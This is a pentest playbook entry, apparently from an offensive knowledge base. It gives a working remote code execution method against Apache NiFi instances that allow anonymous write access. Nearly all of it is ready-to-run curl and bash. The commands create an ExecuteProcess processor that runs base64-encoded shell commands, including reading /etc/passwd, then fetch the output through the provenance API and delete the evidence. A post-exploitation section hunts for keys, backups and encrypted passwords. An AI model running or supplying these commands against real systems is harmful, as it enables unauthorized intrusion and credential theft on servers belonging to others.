# NiFi API Remote Code Execution

## When to use

- Apache NiFi is accessible (typically port 8080 or proxied through 80/443)
- Anonymous access is enabled (NiFi < 1.22.0 default, or misconfigured)
- Need to execute commands on the NiFi host

## Tags

- ATT&CK: T1190 (Exploit Public-Facing Application), T1059.004 (Unix Shell)
- Platform: Linux, Windows
- Phase: exploit
- Product: Apache NiFi

## Reconnaissance

Check version and permissions:

```bash
# Version (no auth needed)
curl -s http://TARGET/nifi-api/flow/about | jq '.about.version'

# Auth check
curl -s http://TARGET/nifi-api/flow/process-groups/root | jq '.permissions'
# {"canRead":true,"canWrite":true} = anonymous write access
```

Get the root process group ID:

```bash
curl -s http://TARGET/nifi-api/flow/process-groups/root | jq '.processGroupFlow.id'
```

## Command execution via ExecuteProcess

Create, run, and read output from an ExecuteProcess processor:

```bash
API="http://TARGET/nifi-api"
ROOT_PG="<root-process-group-id>"

# Encode command
CMD_B64=$(echo -n 'id; whoami; cat /etc/passwd' | base64 | tr -d '\n')

# Create processor
PROC=$(curl -s -X POST "${API}/process-groups/${ROOT_PG}/processors" \
  -H "Content-Type: application/json" \
  -d "{\"revision\":{\"version\":0},\"component\":{
    \"type\":\"org.apache.nifi.processors.standard.ExecuteProcess\",
    \"name\":\"cmd\",
    \"config\":{
      \"properties\":{
        \"Command\":\"/bin/bash\",
        \"Command Arguments\":\"-c,echo ${CMD_B64}|base64 -d|bash\",
        \"Argument Delimiter\":\",\",
        \"Redirect Error Stream\":\"true\"
      },
      \"autoTerminatedRelationships\":[\"success\"],
      \"schedulingPeriod\":\"9999 sec\"
    },
    \"position\":{\"x\":100,\"y\":100}
  }}")
PID=$(echo "$PROC" | jq -r '.id')

# Run (once)
curl -s -X PUT "${API}/processors/${PID}/run-status" \
  -H "Content-Type: application/json" \
  -d '{"revision":{"version":1},"state":"RUNNING"}'
sleep 4
curl -s -X PUT "${API}/processors/${PID}/run-status" \
  -H "Content-Type: application/json" \
  -d '{"revision":{"version":2},"state":"STOPPED"}'
sleep 2

# Read output via provenance (filtered by processor ID)
PROV_ID=$(curl -s -X POST "${API}/provenance" \
  -H "Content-Type: application/json" \
  -d "{\"provenance\":{\"request\":{\"maxResults\":5,
    \"searchTerms\":{\"ProcessorID\":{\"value\":\"${PID}\"}}}}}" | jq -r '.provenance.id')
sleep 1
EVENT_ID=$(curl -s "${API}/provenance/${PROV_ID}" | \
  python3 -c "import json,sys; events=json.load(sys.stdin)['provenance']['results']['provenanceEvents']; avail=[e for e in events if e.get('outputContentAvailable')]; print(max(avail, key=lambda e: e['eventId'])['eventId']) if avail else print('NONE')")
curl -s "${API}/provenance-events/${EVENT_ID}/content/output"

# Cleanup
curl -s -X DELETE "${API}/provenance/${PROV_ID}"
curl -s -X DELETE "${API}/processors/${PID}?version=3"
```

## Important notes

- Set `schedulingPeriod=9999 sec` so the processor only runs once per start/stop cycle
- Always delete provenance queries after reading (max 11 pending before 409 errors)
- Delete processors after use to keep the canvas clean
- The command delimiter splits ALL arguments; use base64 encoding to avoid issues with semicolons, pipes, etc.
- `Redirect Error Stream=true` captures stderr in the output
- Output goes to auto-terminated flowfiles; read via provenance content API

## Post-exploitation enumeration

After getting a shell as `nifi`, check these locations:

```bash
# Leaked credentials in NiFi directories
find /opt/nifi* -name "*.bak" -o -name "*key*" -o -name "*id_*" -o -name "*password*" | grep -v .jar

# Support bundles (diagnostic dumps, often contain sensitive data)
ls -laR /opt/nifi*/support-bundles/

# Sensitive props key (decrypts enc{} values in flow config)
grep "nifi.sensitive.props.key" /opt/nifi*/conf/nifi.properties

# Encrypted passwords in flow config
python3 -c "import gzip,json; d=json.load(gzip.open('/opt/nifi*/conf/flow.json.gz')); [print(k,v) for cs in d.get('rootGroup',{}).get('controllerServices',[]) for k,v in cs.get('properties',{}).items() if v and 'enc{' in str(v)]"

# DBCP connection details
curl -s http://localhost:8080/nifi-api/controller-services/{id} | jq '.component.properties'
```

## References

- CVE-2023-34468 for H2 DBCP-specific exploitation
- NiFi REST API documentation: `/nifi-docs/rest-api/`
